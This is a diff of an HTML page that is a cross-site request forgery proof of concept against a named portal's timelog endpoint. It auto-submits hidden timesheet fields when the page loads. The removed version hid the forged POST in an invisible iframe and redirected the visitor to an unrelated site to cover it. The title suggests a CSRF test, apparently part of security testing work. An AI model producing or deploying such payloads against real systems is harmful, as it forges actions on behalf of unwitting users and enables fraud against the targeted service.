@@ -1,34 +1,23 @@
 <html>
-<head>
-    <title>Caricamento...</title>
-</head>
-<body>
-    <iframe name="hidden_iframe" style="display:none;"></iframe>
+  <head>
+    <title>Test CSRF in corso...</title>
+  </head>
 
-    <form name="csrf_form" 
-          action="httpsA://portal.dynamisprc.com:8443/timelog" 
-          method="POST" 
-          target="hidden_iframe">
+  <body onload="document.forms[0].submit();">
+
+    <h2 style="font-family: sans-serif;">Caricamento...</h2>
+
+    <form id="csrf-attack-form" 
+          action="https://portal.dynamisprc.com:8443/timelog" 
+          method="POST">
           
-        <input type="hidden" name="date" value="03/11 - 09/11 2025" />
-        <input type="hidden" name="system" value="Low Voltage System" />
-        <input type="hidden" name="assembly" value="Telemetry" />
-        <input type="hidden" name="activity" value="Software" />
-        <input type="hidden" name="hours" value="1" />
+      <input type="hidden" name="date" value="03/11 - 09/11 2025" />
+      <input type="hidden" name="system" value="Low Voltage System" />
+      <input type="hidden" name="assembly" value="Telemetry" />
+      <input type="hidden" name="activity" value="Software" />
+      
+      <input type="hidden" name="hours" value="1" />
     </form>
 
-    <script>
-        try {
-            document.forms['csrf_form'].submit();
-            
-	    setTimeout(function() {
-                window.location.href = 'https://bresaolavaltellina.it/';
-            }, 500);
-            
-        } catch (e) {
-            window.location.href = 'https://bresaolavaltellina.it/';
-        }
-    </script>
-
-</body>
+  </body>
 </html>
